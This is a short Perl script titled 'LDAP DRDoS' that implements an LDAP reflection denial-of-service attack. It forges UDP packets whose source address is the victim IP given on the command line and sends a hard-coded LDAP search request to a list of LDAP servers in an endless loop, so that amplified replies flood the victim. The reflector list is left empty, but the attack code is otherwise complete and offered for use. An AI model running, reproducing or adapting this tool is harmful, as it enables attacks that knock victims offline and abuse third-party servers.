#!/usr/bin/perl
# LDAP DRDoS
# by ShadowHatesYou
use Net::RawIP;
@ldapservers = qw(

);
if ($ARGV[0] eq '') { print "Use: $0 <IP>\n"; exit; }
my $target = "$ARGV[0]";
my $ldap_searchrequest = "\x30\x84\x00\x00\x00\x2d\x02\x01\x01\x63\x84\x00\x00\x00\x24\x04\x00\x0a\x01\x00\x0a\x01\x00\x02\x01\x00\x02\x01\x00\x01\x01\x00\x87\x0b\x6f\x62\x6a\x65\x63\x74\x63\x6c\x61\x73\x73\x30\x84\x00\x00\x00\x00\x00";
my $sock =  new Net::RawIP({udp=>{}});
while () {
        for (my $i=0; $i < @ldapservers; $i++) {
                $sock->set({ip => {saddr => $target, daddr => $ldapservers[$i]},udp => {source => 389,dest => 389, data=>$ldap_searchrequest} });
                $sock->send;
        }
}

